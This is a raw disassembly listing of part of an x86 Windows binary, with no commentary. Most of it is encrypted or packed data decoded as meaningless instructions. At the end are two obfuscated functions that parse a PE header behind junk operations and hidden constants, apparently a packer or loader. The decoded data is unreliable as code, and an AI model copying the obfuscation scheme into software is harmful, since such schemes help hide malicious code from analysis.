  40f26b:	pop    edi
  40f26c:	add    eax,esi
  40f26e:	jmp    0x40f634
  40f273:	xchg   ecx,eax
  40f274:	pushf  
  40f275:	out    0xec,al
  40f277:	icebp  
  40f278:	jbe    0x40f20b
  40f27a:	popa   
  40f27b:	out    dx,eax
  40f27c:	bound  ecx,QWORD PTR [edx+0x4ef915d9]
  40f282:	mov    fs,WORD PTR [ecx-0x56]
  40f285:	jl     0x40f303
  40f287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f288:	jns    0x40f306
  40f28a:	jl     0x40f2fe
  40f28c:	nop
  40f28d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f28e:	mov    ch,0x5
  40f290:	out    0xa4,al
  40f292:	ss mov bl,0xd6
  40f295:	addr16 das 
  40f297:	pop    edx
  40f298:	and    BYTE PTR [edi+0x44],0x8c
  40f29c:	leave  
  40f29d:	rcl    DWORD PTR [edi],cl
  40f29f:	jne    0x40f2a8
  40f2a1:	out    0x1c,eax
  40f2a3:	shl    DWORD PTR [ebp-0x5019232d],1
  40f2a9:	sub    eax,0x61eccf1
  40f2ae:	js     0x40f304
  40f2b0:	adc    esi,DWORD PTR [ebp-0x60f117df]
  40f2b6:	es in  al,dx
  40f2b8:	mov    ebx,0x5b944bba
  40f2bd:	in     al,dx
  40f2be:	ret    
  40f2bf:	pop    sp
  40f2c1:	dec    esi
  40f2c2:	pop    esp
  40f2c3:	or     BYTE PTR [ebp+ecx*4+0x1c5b2550],bl
  40f2ca:	inc    eax
  40f2cb:	int3   
  40f2cc:	pop    DWORD PTR [esi-0x61]
  40f2cf:	mov    edi,0x72699a5b
  40f2d4:	cmp    eax,0xafa871b9
  40f2d9:	add    BYTE PTR [ecx+0x57c1e43f],0x69
  40f2e0:	jb     0x40f320
  40f2e2:	or     eax,0x3ce8246c
  40f2e7:	cmp    BYTE PTR [edi],dl
  40f2e9:	ins    BYTE PTR es:[edi],dx
  40f2ea:	(bad)  [esp+eiz*8-0x4584825e]
  40f2f1:	dec    edx
  40f2f2:	call   0xc3826329
  40f2f7:	push   ss
  40f2f8:	push   esi
  40f2f9:	or     cl,bh
  40f2fb:	scas   al,BYTE PTR es:[edi]
  40f2fc:	push   0x655f62f6
  40f301:	mov    WORD PTR ds:0x5995bf12,es
  40f307:	push   eax
  40f308:	jns    0x40f35b
  40f30a:	pop    eax
  40f30b:	stos   DWORD PTR es:[edi],eax
  40f30c:	lods   eax,DWORD PTR ds:[esi]
  40f30d:	dec    esp
  40f30e:	aam    0xeb
  40f310:	outs   dx,BYTE PTR ds:[esi]
  40f311:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f312:	rol    DWORD PTR [esi],cl
  40f314:	add    al,0x36
  40f316:	mov    DWORD PTR [edi+0x1],esp
  40f319:	dec    esp
  40f31a:	ret    
  40f31b:	xor    cl,BYTE PTR [eax-0x79753c73]
  40f321:	pop    ecx
  40f322:	xor    al,bl
  40f324:	neg    DWORD PTR [edx+0x29216d1b]
  40f32a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f32b:	repnz jmp FWORD PTR [esi]
  40f32e:	in     eax,dx
  40f32f:	add    cl,BYTE PTR [ebx-0x2b903ae2]
  40f335:	dec    ebp
  40f336:	mov    ebp,0xf7019519
  40f33b:	outs   dx,BYTE PTR cs:[esi]
  40f33d:	jbe    0x40f385
  40f33f:	(bad)  
  40f340:	pop    ebx
  40f341:	stos   DWORD PTR es:[edi],eax
  40f342:	inc    eax
  40f343:	cmp    al,0xc0
  40f345:	(bad)  
  40f346:	sbb    ah,BYTE PTR [ebx+0x5b]
  40f349:	pop    es
  40f34a:	shl    dl,cl
  40f34c:	pop    esp
  40f34d:	xchg   edi,eax
  40f34e:	hlt    
  40f34f:	loope  0x40f3b5
  40f351:	pop    ebx
  40f352:	sub    al,0x2a
  40f354:	imul   edi,DWORD PTR [esi-0x696d5022],0xffffffe8
  40f35b:	jb     0x40f3d2
  40f35d:	jl     0x40f370
  40f35f:	cld    
  40f360:	jmp    0x40f379
  40f362:	js     0x40f3be
  40f364:	inc    eax
  40f365:	shr    DWORD PTR [edi+0x2f],1
  40f368:	int3   
  40f369:	hlt    
  40f36a:	cmp    esi,0xffffff9d
  40f36d:	aam    0x1f
  40f36f:	lahf   
  40f370:	sbb    BYTE PTR [ebp+0x5407f7d6],dh
  40f376:	aam    0xbf
  40f378:	or     al,0x8e
  40f37a:	int    0xa
  40f37c:	sub    cl,dl
  40f37e:	push   esi
  40f37f:	sub    esp,0xe232648c
  40f385:	pop    ds
  40f386:	jmp    DWORD PTR [edi-0x49]
  40f389:	cmp    al,0x9e
  40f38b:	sub    DWORD PTR [edi],eax
  40f38d:	into   
  40f38e:	loop   0x40f3b9
  40f390:	push   edx
  40f391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f392:	(bad)  
  40f393:	mov    ah,0xf4
  40f395:	fwait
  40f396:	sbb    eax,0xf2075d48
  40f39b:	add    BYTE PTR [ecx+0x34],cl
  40f39e:	pop    eax
  40f39f:	out    dx,eax
  40f3a0:	lahf   
  40f3a1:	jp     0x40f35f
  40f3a3:	push   esi
  40f3a4:	mov    ebx,?
  40f3a6:	bound  ebp,QWORD PTR [ecx-0x16]
  40f3a9:	jbe    0x40f34d
  40f3ab:	enter  0x2594,0x36
  40f3af:	inc    esi
  40f3b0:	loop   0x40f415
  40f3b2:	cmp    eax,0x5d6489a3
  40f3b7:	mov    ah,0x45
  40f3b9:	lock dec ebx
  40f3bb:	push   ebp
  40f3bc:	cmp    BYTE PTR [edi+ecx*8],ch
  40f3bf:	aam    0x51
  40f3c1:	ds in  al,0x9c
  40f3c4:	(bad)  
  40f3c5:	mov    esp,0x34ca78f7
  40f3ca:	pop    ecx
  40f3cb:	jmp    FWORD PTR [edx+0x1f]
  40f3ce:	test   al,0xb0
  40f3d0:	fiadd  WORD PTR ds:0xc874ce9d
  40f3d6:	mov    al,ds:0x23fd96d4
  40f3db:	inc    esi
  40f3dc:	test   eax,0x54f7f09b
  40f3e1:	rol    DWORD PTR [esi+0x8],0x25
  40f3e5:	sti    
  40f3e6:	or     eax,DWORD PTR [esp+edx*8]
  40f3e9:	dec    ecx
  40f3ea:	sub    DWORD PTR [edx+ebx*2],eax
  40f3ed:	dec    ebp
  40f3ee:	jl     0x40f3c2
  40f3f0:	adc    ebp,ebp
  40f3f2:	add    ebp,edx
  40f3f4:	add    eax,edi
  40f3f6:	jmp    0xab8fca39
  40f3fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3fc:	pop    esi
  40f3fd:	xchg   edx,eax
  40f3fe:	daa    
  40f3ff:	inc    edi
  40f400:	cmp    eax,0xd176cb5e
  40f405:	dec    esp
  40f406:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f407:	repz dec edi
  40f409:	retf   
  40f40a:	pop    edx
  40f40b:	mov    ds:0xa31915e4,eax
  40f410:	or     cl,BYTE PTR [ecx+0x30]
  40f413:	rcr    BYTE PTR [edx+ecx*4-0x4f84acce],0xbb
  40f41b:	mov    ds:0x9b87b74f,eax
  40f420:	inc    edx
  40f421:	fisttp QWORD PTR [ecx+0x306cda5a]
  40f427:	push   ebx
  40f428:	test   BYTE PTR [ebp-0x53],dl
  40f42b:	out    dx,al
  40f42c:	adc    al,0x18
  40f42e:	lock ret 
  40f430:	or     DWORD PTR [ecx-0x7ba0c541],0xcbe69834
  40f43a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f43b:	iret   
  40f43c:	mov    esp,0xebfe81e
  40f441:	mov    ds:0xf76fdc51,al
  40f446:	dec    edx
  40f447:	in     al,dx
  40f448:	add    BYTE PTR [edi-0x29d34f33],bh
  40f44e:	in     eax,dx
  40f44f:	jl     0x40f446
  40f451:	mov    ecx,0x4be9414c
  40f456:	scas   eax,DWORD PTR es:[edi]
  40f457:	xor    BYTE PTR [eax+esi*4],dh
  40f45a:	int    0xfc
  40f45c:	xchg   esp,eax
  40f45d:	sbb    al,0xf5
  40f45f:	inc    eax
  40f460:	mov    dl,0x41
  40f462:	(bad)  
  40f463:	jl     0x40f4b9
  40f465:	cli    
  40f466:	mov    eax,ds:0x32be9ce2
  40f46b:	jmp    0x40f4cf
  40f46d:	jb     0x40f471
  40f46f:	in     eax,0x81
  40f471:	mov    edi,0xf9e22358
  40f476:	xchg   al,bh
  40f478:	pusha  
  40f479:	mov    al,0x49
  40f47b:	sub    al,0xca
  40f47d:	in     eax,dx
  40f47e:	imul   eax,ecx,0xd934d604
  40f484:	push   edx
  40f485:	sbb    al,cl
  40f487:	mov    ecx,0x5288eb30
  40f48c:	and    edx,esi
  40f48e:	mov    ds:0xc2178,eax
  40f493:	mov    ds:0x350937a2,eax
  40f498:	test   DWORD PTR [edi+0x4a],eax
  40f49b:	popf   
  40f49c:	jo     0x40f430
  40f49e:	test   BYTE PTR [edx-0x3aafed27],cl
  40f4a4:	adc    eax,0x1ce6b70
  40f4a9:	adc    al,0x8b
  40f4ab:	mov    ecx,0xdfbb050c
  40f4b0:	mov    esp,0x88b9f07b
  40f4b5:	sub    ch,BYTE PTR [eax+0x3b]
  40f4b8:	inc    esp
  40f4b9:	jl     0x40f504
  40f4bb:	mov    al,0xb1
  40f4bd:	cdq    
  40f4be:	dec    ebx
  40f4bf:	mov    bl,0x4f
  40f4c1:	loopne 0x40f4b4
  40f4c3:	lahf   
  40f4c4:	loop   0x40f4ac
  40f4c6:	xchg   esi,eax
  40f4c7:	mov    al,0x90
  40f4c9:	lods   eax,DWORD PTR ds:[esi]
  40f4ca:	add    DWORD PTR [ebx-0x36960a7f],esp
  40f4d0:	int    0x4a
  40f4d2:	xchg   ecx,eax
  40f4d3:	dec    edi
  40f4d4:	dec    ebp
  40f4d5:	arpl   di,bp
  40f4d7:	cmp    eax,0x375e8100
  40f4dc:	(bad)  
  40f4dd:	dec    ecx
  40f4de:	xchg   ebx,eax
  40f4df:	mov    eax,ds:0x69f4b5dc
  40f4e4:	into   
  40f4e5:	push   edi
  40f4e6:	psubb  mm3,mm2
  40f4e9:	mov    dh,0xbe
  40f4eb:	stos   BYTE PTR es:[edi],al
  40f4ec:	rcl    BYTE PTR [ebx+0x67],0xa5
  40f4f0:	rol    DWORD PTR [ebx-0x5052c98f],0xf4
  40f4f7:	repz adc ch,ah
  40f4fa:	sti    
  40f4fb:	out    0x9,eax
  40f4fd:	mov    ecx,0x5a04741e
  40f502:	fidiv  WORD PTR ds:[edx]
  40f505:	rsqrtps xmm7,XMMWORD PTR [esi-0x3c]
  40f509:	scas   al,BYTE PTR es:[edi]
  40f50a:	inc    edi
  40f50b:	jo     0x40f509
  40f50d:	pop    esi
  40f50e:	jae    0x40f49f
  40f510:	test   eax,0x13585e55
  40f515:	mov    ebp,db6
  40f518:	shl    DWORD PTR [edx+0xa],cl
  40f51b:	mov    ecx,0x195506df
  40f520:	lods   al,BYTE PTR ds:[esi]
  40f521:	je     0x40f539
  40f523:	into   
  40f524:	xchg   ebx,eax
  40f525:	(bad)  
  40f526:	xchg   edi,eax
  40f527:	dec    ebp
  40f528:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40f52a:	and    dh,BYTE PTR [eax+ecx*1-0x264c97b]
  40f531:	fsubr  st,st(2)
  40f533:	fiadd  WORD PTR ds:0x2cae75ca
  40f539:	cld    
  40f53a:	or     edi,edi
  40f53c:	push   ecx
  40f53d:	loope  0x40f5a0
  40f53f:	fldenv [edx]
  40f541:	xchg   edi,eax
  40f542:	in     eax,dx
  40f543:	js     0x40f4e0
  40f545:	jno    0x40f587
  40f547:	fucomip st,st(4)
  40f549:	mov    edi,0xf8684845
  40f54e:	xor    BYTE PTR [esi],al
  40f550:	pop    ebx
  40f551:	lods   al,BYTE PTR ds:[esi]
  40f552:	ret    
  40f553:	loop   0x40f4df
  40f555:	cli    
  40f556:	xor    eax,0xd1e91ce4
  40f55b:	in     al,dx
  40f55c:	jo     0x40f50a
  40f55e:	ret    
  40f55f:	sti    
  40f560:	xchg   edi,eax
  40f561:	xor    dl,BYTE PTR [ecx]
  40f563:	add    BYTE PTR [ebx-0x2e],dl
  40f566:	jns    0x40f569
  40f568:	xchg   esp,eax
  40f569:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f56a:	(bad)  
  40f56b:	arpl   sp,dx
  40f56d:	mov    bl,0x10
  40f56f:	aad    0x10
  40f571:	fnsave [ebx]
  40f573:	pop    edx
  40f574:	fwait
  40f575:	pushf  
  40f576:	jp     0x40f579
  40f578:	mov    ds:0x19811c2a,eax
  40f57d:	and    DWORD PTR [ecx-0x34],ebx
  40f580:	test   BYTE PTR [esi-0x2c8f561f],ch
  40f586:	jo     0x40f597
  40f588:	xchg   edx,eax
  40f589:	shr    DWORD PTR [edx+0x5d99c124],1
  40f58f:	ins    BYTE PTR es:[edi],dx
  40f590:	inc    ebp
  40f591:	mov    edx,0x14640af0
  40f596:	test   eax,0xb707911a
  40f59b:	lahf   
  40f59c:	inc    ecx
  40f59d:	mov    WORD PTR [bp+si+0x4],?
  40f5a1:	test   BYTE PTR ds:0x9d20a9c6,bl
  40f5a7:	inc    ebp
  40f5a8:	packuswb mm3,QWORD PTR [edx+edx*8-0x70]
  40f5ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5ae:	icebp  
  40f5af:	xchg   edi,eax
  40f5b0:	xchg   ebp,eax
  40f5b1:	pop    edx
  40f5b2:	sbb    eax,0x12b548ed
  40f5b7:	sbb    bl,BYTE PTR [eax+0x664e09db]
  40f5bd:	nop
  40f5be:	or     ebx,DWORD PTR ds:0xcd6b13b1
  40f5c4:	mov    DWORD PTR ds:0x5cb18d9d,esp
  40f5ca:	fnstenv [ebp-0x5d1ea353]
  40f5d0:	(bad)  
  40f5d1:	sub    dl,ah
  40f5d3:	ja     0x40f572
  40f5d5:	mov    dl,BYTE PTR [edi-0x12]
  40f5d8:	fcom   QWORD PTR [ebp-0x6685879d]
  40f5de:	pop    ebp
  40f5df:	cs das 
  40f5e1:	jmp    0x40f59e
  40f5e3:	sbb    BYTE PTR [edi-0x27fe16ed],al
  40f5e9:	fsub   QWORD PTR [edx-0x14]
  40f5ec:	fwait
  40f5ed:	xor    al,0xe8
  40f5f0:	retf   
  40f5f1:	dec    edx
  40f5f2:	mov    ebp,0xf5c43281
  40f5f7:	mov    al,ds:0xdaec0dfe
  40f5fc:	push   eax
  40f5fd:	cmp    ch,BYTE PTR [edi-0x52]
  40f600:	pushf  
  40f601:	jno    0x40f59f
  40f603:	lahf   
  40f604:	call   0xddb8:0x376c7a58
  40f60b:	daa    
  40f60c:	pop    ebp
  40f60d:	mov    dh,0x5c
  40f60f:	in     eax,0xc
  40f611:	(bad)  
  40f612:	fcom   DWORD PTR [esi]
  40f614:	mov    esp,0x7cb4474d
  40f619:	xor    BYTE PTR [eax+0x25],ah
  40f61c:	mov    ecx,0x3279a5bf
  40f621:	sub    DWORD PTR [esi-0x220f4afe],ecx
  40f627:	xor    al,0x2a
  40f629:	pop    DWORD PTR [ecx-0x73a2f83d]
  40f62f:	xor    esp,DWORD PTR [esi+0x5ec2a3a8]
  40f635:	leave  
  40f636:	ret    0xc
  40f639:	push   ebp
  40f63a:	mov    ebp,esp
  40f63c:	push   ecx
  40f63d:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40f644:	mov    eax,DWORD PTR [ebp+0x8]
  40f647:	sbb    DWORD PTR ds:0x4335ef,0x1bf0
  40f651:	mov    al,BYTE PTR [eax]
  40f653:	and    DWORD PTR ds:0x4335df,0x4335a3
  40f65d:	jmp    0x40f925
  40f662:	pop    es
  40f663:	sbb    DWORD PTR [edx],ebp
  40f665:	pop    ecx
  40f666:	xor    dh,BYTE PTR [ebp+0x53]
  40f669:	popa   
  40f66a:	inc    eax
  40f66b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f66c:	push   esi
  40f66d:	call   0xb688:0x2d770987
  40f674:	jl     0x40f6f2
  40f676:	mov    eax,ds:0xcd7c7c7e
  40f67b:	mov    esp,?
  40f67d:	lds    ecx,FWORD PTR [eax]
  40f67f:	mov    gs,WORD PTR [ebx]
  40f681:	gs js  0x40f616
  40f684:	inc    ecx
  40f685:	xchg   ebp,eax
  40f686:	mov    ecx,0x9096c817
  40f68b:	sub    eax,0x2a86e278
  40f690:	retf   0xf406
  40f693:	xchg   ebx,eax
  40f694:	adc    DWORD PTR [edx],edi
  40f696:	dec    BYTE PTR [ebp+0x71db7c22]
  40f69c:	dec    eax
  40f69d:	dec    esi
  40f69e:	pop    ss
  40f69f:	loop   0x40f6b8
  40f6a1:	dec    esp
  40f6a2:	and    DWORD PTR [esi-0x46],0x30953b1e
  40f6a9:	ins    BYTE PTR es:[edi],dx
  40f6aa:	(bad)  
  40f6ab:	cs cdq 
  40f6ad:	push   edx
  40f6ae:	mov    esp,0xf4cd4548
  40f6b3:	jmp    0x9024:0x44cf9798
  40f6ba:	cmp    DWORD PTR [ebx+esi*4],ecx
  40f6bd:	xor    DWORD PTR [eax],ebx
  40f6bf:	sbb    BYTE PTR [esi+0x50504ce2],0xb7
  40f6c6:	out    0x14,eax
  40f6c8:	jnp    0x40f6d5
  40f6ca:	add    al,0x63
  40f6cc:	sub    eax,0xb4f702a7
  40f6d1:	or     ah,BYTE PTR [esi]
  40f6d3:	repnz scas eax,DWORD PTR es:[edi]
  40f6d5:	add    eax,0x71aa2c19
  40f6da:	scas   al,BYTE PTR es:[edi]
  40f6db:	sub    al,0xc7
  40f6dd:	mov    ah,0xe
  40f6df:	push   esp
  40f6e0:	and    edx,edi
  40f6e2:	jmp    0x40f673
  40f6e4:	aam    0x7c
  40f6e6:	push   ecx
  40f6e7:	jmp    0x6acc44fb
  40f6ec:	adc    eax,eax
  40f6ee:	jo     0x40f73e
  40f6f0:	jno    0x40f6c1
  40f6f2:	out    dx,eax
  40f6f3:	mov    bl,0x15
  40f6f5:	fist   DWORD PTR [ebp+eiz*1-0x2c]
  40f6f9:	cmc    
  40f6fa:	adc    al,0x4a
  40f6fc:	fsubrp st(5),st
  40f6fe:	gs jmp 0x87b9026
  40f704:	mov    edx,0x13f4b3d8
  40f709:	outs   dx,BYTE PTR ds:[esi]
  40f70a:	pop    ebp
  40f70b:	loop   0x40f6c7
  40f70d:	(bad)  
  40f70e:	aam    0xb8
  40f710:	push   ebx
  40f711:	fs iret 
  40f713:	push   ebx
  40f714:	sub    BYTE PTR [ebp+0x2],dl
  40f717:	xchg   ebx,eax
  40f719:	mov    bl,0x37
  40f71b:	imul   esp,DWORD PTR [eax-0x3b],0xaaca2d1b
  40f722:	fchs   
  40f725:	int    0x4e
  40f727:	pop    esp
  40f728:	rcl    DWORD PTR [eax+0x6e],cl
  40f72b:	cmc    
  40f72c:	or     DWORD PTR [eax+0x6a],edx
  40f72f:	je     0x40f70c
  40f731:	inc    ecx
  40f732:	ret    
  40f733:	mov    DWORD PTR [ecx+0x7b],0xf0637a79
  40f73a:	push   ecx
  40f73b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f73c:	mov    edi,0xba76233e
  40f741:	mov    esp,0xa30de4b8
  40f746:	mov    dh,0x53
  40f748:	bound  esp,QWORD PTR [edi+0x69]
  40f74b:	(bad)  [esi-0x635a9bc7]
  40f751:	xor    ecx,esi
  40f753:	aad    0xde
  40f755:	test   al,0xf1
  40f757:	xor    eax,0x36c8cacc
  40f75c:	inc    edi
  40f75d:	mov    cl,0x3d
  40f75f:	ret    
  40f760:	stos   DWORD PTR es:[edi],eax
  40f761:	inc    ebp
  40f762:	fxch   st(6)
  40f764:	enter  0x2712,0x75
  40f768:	mov    dl,0xc1
  40f76a:	cmc    
  40f76b:	xchg   esp,eax
  40f76c:	sub    esp,DWORD PTR [eax+0x33dc630d]
  40f772:	mov    al,0xd
  40f774:	sbb    al,bl
  40f776:	or     al,0xcb
  40f778:	lock push es
  40f77a:	outs   dx,BYTE PTR ds:[esi]
  40f77b:	xor    eax,0xedd0ac3
  40f780:	ror    DWORD PTR [ebp+0x19d554b5],0xa6
  40f787:	dec    edx
  40f788:	push   ds
  40f789:	and    eax,0xd4373c7d
  40f78e:	xchg   DWORD PTR [esi+0x2839fb7f],edi
  40f794:	pop    ebx
  40f795:	dec    ecx
  40f796:	mov    edx,0x45141565
  40f79b:	cmp    edi,DWORD PTR [ecx-0x34]
  40f79e:	or     ch,BYTE PTR ds:[ebx+0x77]
  40f7a2:	lods   al,BYTE PTR ds:[esi]
  40f7a3:	add    BYTE PTR [ebx+esi*1-0x2d],0x9d
  40f7a8:	cmc    
  40f7a9:	pop    edi
  40f7aa:	pop    edx
  40f7ab:	cmp    eax,0xc0396305
  40f7b0:	call   0x3057:0x583d48e7
  40f7b7:	clc    
  40f7b8:	sub    al,0xc7
  40f7ba:	inc    edx
  40f7bb:	and    al,0x1c
  40f7bd:	(bad)  
  40f7be:	xor    al,0x28
  40f7c0:	xchg   ebx,eax
  40f7c1:	mov    ebx,0x480cdb1a
  40f7c6:	aaa    
  40f7c7:	repz icebp 
  40f7c9:	or     al,BYTE PTR [edi]
  40f7cb:	inc    edi
  40f7cc:	sub    DWORD PTR [edx],0x3a
  40f7cf:	push   ss
  40f7d0:	xchg   edx,eax
  40f7d1:	(bad)  
  40f7d3:	mov    esp,0x5a172d6d
  40f7d8:	jne    0x40f804
  40f7da:	or     eax,0xd1b14207
  40f7df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7e0:	div    BYTE PTR [edi-0x2ba47604]
  40f7e6:	iret   
  40f7e7:	sti    
  40f7e8:	(bad)  
  40f7e9:	pop    ss
  40f7ea:	xlat   BYTE PTR ds:[ebx]
  40f7eb:	test   BYTE PTR [eax-0x17],ah
  40f7ee:	adc    DWORD PTR [edi+ebx*8-0x43],edx
  40f7f2:	or     eax,0x54e7542a
  40f7f7:	scas   al,BYTE PTR es:[edi]
  40f7f8:	jecxz  0x40f847
  40f7fa:	retf   
  40f7fb:	repz push edi
  40f7fd:	lods   eax,DWORD PTR ds:[esi]
  40f7fe:	mov    ds,WORD PTR [edi-0x1e12206b]
  40f804:	push   0x4657a3b7
  40f809:	leave  
  40f80a:	adc    eax,0xc43d19a4
  40f80f:	dec    edi
  40f810:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f811:	in     eax,0xc8
  40f813:	gs add bl,BYTE PTR gs:[esi+0x6f]
  40f818:	sub    eax,0x546debcb
  40f81d:	mov    al,ds:0x55c5381e
  40f822:	and    eax,0x24d88927
  40f827:	in     eax,0x6
  40f829:	mov    ds:0xff6d60ac,eax
  40f82e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f82f:	sub    DWORD PTR [edi],eax
  40f831:	fnsave [esi]
  40f833:	adc    bl,BYTE PTR [edi+0x2be439f8]
  40f839:	call   0xce0d8b6c
  40f83e:	mov    al,ds:0xce91ec12
  40f843:	adc    ecx,eax
  40f845:	mov    WORD PTR [edx],ds
  40f847:	(bad)  
  40f848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f849:	pop    edx
  40f84a:	outs   dx,DWORD PTR ds:[esi]
  40f84b:	or     eax,esp
  40f84d:	mov    ?,WORD PTR [edi+ebx*2]
  40f850:	sbb    al,0xc5
  40f852:	pop    esp
  40f853:	and    BYTE PTR [ebx+0x76164d52],dl
  40f859:	(bad)  
  40f85a:	cmp    al,0x50
  40f85c:	sub    eax,0x3d30de32
  40f861:	dec    eax
  40f862:	mov    BYTE PTR [ebx+0x46],dh
  40f865:	mov    ds:0x8d24cf33,eax
  40f86a:	ss pop esi
  40f86c:	adc    esi,0xffffff82
  40f86f:	add    al,0x7a
  40f871:	xchg   edx,eax
  40f872:	or     eax,0xa338c901
  40f877:	sahf   
  40f878:	or     bh,BYTE PTR [edi]
  40f87a:	out    0x8,al
  40f87c:	aaa    
  40f87d:	test   eax,0x6c2b7170
  40f882:	pop    ds
  40f883:	(bad)  
  40f884:	jge    0x40f8e7
  40f886:	jl     0x40f815
  40f888:	push   ss
  40f889:	push   0x81ba32d4
  40f88e:	sbb    eax,0x96944b50
  40f893:	test   BYTE PTR [ecx+ebp*2+0x30],dh
  40f897:	mov    dh,0x91
  40f899:	mov    ch,0x30
  40f89b:	sub    bh,BYTE PTR [esi-0x1b9626d5]
  40f8a1:	xchg   edi,eax
  40f8a2:	push   esi
  40f8a3:	inc    edi
  40f8a4:	jnp    0x40f889
  40f8a6:	or     ebp,edi
  40f8a8:	gs popf 
  40f8aa:	jge    0x40f906
  40f8ac:	add    edx,edi
  40f8ae:	rcl    DWORD PTR [eax-0x1d7b128b],1
  40f8b4:	popf   
  40f8b5:	icebp  
  40f8b6:	sub    DWORD PTR [eax],esp
  40f8b8:	ds lock in eax,0xe4
  40f8bc:	xchg   ebp,eax
  40f8bd:	sub    al,0xfc
  40f8bf:	ss loope 0x40f88e
  40f8c2:	fnsave [ecx-0x2b]
  40f8c5:	and    eax,0xc88d61dd
  40f8ca:	adc    al,0x5e
  40f8cc:	stos   BYTE PTR es:[edi],al
  40f8cd:	or     BYTE PTR [edi+0x70e89472],dh
  40f8d3:	xlat   BYTE PTR ds:[ebx]
  40f8d4:	mov    ecx,0xe9c34c2d
  40f8d9:	adc    esi,DWORD PTR [esp+ecx*8-0x17150bae]
  40f8e0:	and    eax,0xa368aa1f
  40f8e5:	clc    
  40f8e6:	cmp    BYTE PTR [ebp-0x5b024a99],ch
  40f8ec:	mov    ebp,DWORD PTR [eax-0x35256524]
  40f8f2:	loope  0x40f899
  40f8f4:	pop    ebp
  40f8f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8f6:	icebp  
  40f8f7:	and    ecx,ecx
  40f8f9:	mov    ?,WORD PTR [edx-0xb86186c]
  40f8ff:	lds    edx,FWORD PTR [ecx+0x3ac58120]
  40f905:	xor    eax,0x1c06ae86
  40f90a:	aaa    
  40f90b:	inc    ebx
  40f90c:	sub    eax,0xda364bff
  40f911:	test   ah,cl
  40f913:	retf   
  40f914:	jb     0x40f8bf
  40f916:	xchg   bl,ch
  40f918:	mov    eax,ds:0x2feffb1a
  40f91d:	clc    
  40f91e:	popf   
  40f91f:	push   ebp
  40f920:	in     eax,dx
  40f921:	into   
  40f922:	sub    dl,dl
  40f924:	dec    esp
  40f925:	add    al,0x39
  40f927:	and    DWORD PTR ds:0x43362b,0x4335a7
  40f931:	xor    al,0x45
  40f933:	cmp    al,0xc3
  40f935:	jne    0x40f9bc
  40f93b:	adc    ecx,edx
  40f93d:	mov    eax,DWORD PTR [ebp+0x8]
  40f940:	movzx  ecx,WORD PTR ds:0x43355f
  40f947:	add    DWORD PTR ds:0x433547,ecx
  40f94d:	mov    ecx,DWORD PTR [ebp+0x8]
  40f950:	add    ecx,DWORD PTR [eax+0x3c]
  40f953:	sub    DWORD PTR ds:0x43362f,0x5c72
  40f95d:	mov    edx,0x7510853
  40f962:	add    DWORD PTR ds:0x433617,0x767c
  40f96c:	mov    DWORD PTR [ebp+0x8],ecx
  40f96f:	adc    eax,DWORD PTR ds:0x4335a7
  40f975:	mov    eax,DWORD PTR [ebp-0x4]
  40f978:	movzx  ecx,BYTE PTR ds:0x433663
  40f97f:	adc    ecx,DWORD PTR ds:0x4335ab
  40f985:	mov    DWORD PTR ds:0x433663,ecx
  40f98b:	xor    eax,edx
  40f98d:	push   esi
  40f98e:	xor    esi,0x76d3
  40f994:	mov    esi,DWORD PTR [ebp+0x8]
  40f997:	mov    ecx,0x32729a
  40f99c:	add    eax,ecx
  40f99e:	cmp    DWORD PTR [esi+0x54],eax
  40f9a1:	pop    esi
  40f9a2:	je     0x40f9b0
  40f9a8:	mov    eax,DWORD PTR [ebp+0x8]
  40f9ab:	jmp    0x40f9c9
  40f9b0:	mov    eax,DWORD PTR [ebp-0x4]
  40f9b3:	xor    eax,edx
  40f9b5:	add    eax,ecx
  40f9b7:	jmp    0x40f9c9
  40f9bc:	mov    eax,DWORD PTR [ebp-0x4]
  40f9bf:	xor    eax,0x7510853
  40f9c4:	add    eax,0x32729a
  40f9c9:	leave  
  40f9ca:	ret    0x4
  40f9cd:	push   ebp
  40f9ce:	mov    ebp,esp
  40f9d0:	push   ecx
  40f9d1:	mov    ecx,DWORD PTR [ebp+0x8]
  40f9d4:	mov    eax,0x7510853
  40f9d9:	or     DWORD PTR ds:0x4335b3,0x4335af
  40f9e3:	xor    ecx,eax
  40f9e5:	add    DWORD PTR ds:0x433623,0x6057
  40f9ef:	add    ecx,0x32729a
  40f9f5:	mov    DWORD PTR ds:0x433597,0x14d8
  40f9ff:	mov    DWORD PTR [ebp+0x10],ecx
  40fa02:	mov    ecx,0x737
  40fa07:	mov    DWORD PTR [ebp+0x8],0xf34ceb9
  40fa0e:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40fa15:	mov    DWORD PTR ds:0x4335db,edi
  40fa1b:	mov    ecx,0xf89c8534
  40fa20:	mov    DWORD PTR ds:0x433547,0x6b28
  40fa2a:	push   esi
  40fa2b:	mov    esi,DWORD PTR ds:0x43365f
  40fa31:	mov    DWORD PTR [ebp+0x10],0x70019fb
  40fa38:	mov    esi,DWORD PTR [ebp-0x4]
  40fa3b:	cmp    ecx,esi
  40fa3d:	mov    DWORD PTR ds:0x4335e3,0x9e9
  40fa47:	je     0x40fa8c
  40fa4d:	mov    esi,DWORD PTR [ebp+0xc]
  40fa50:	sbb    DWORD PTR ds:0x433633,0x4335a7
  40fa5a:	xor    ecx,eax
  40fa5c:	xor    DWORD PTR ds:0x43361b,0x6006
  40fa66:	xor    esi,eax
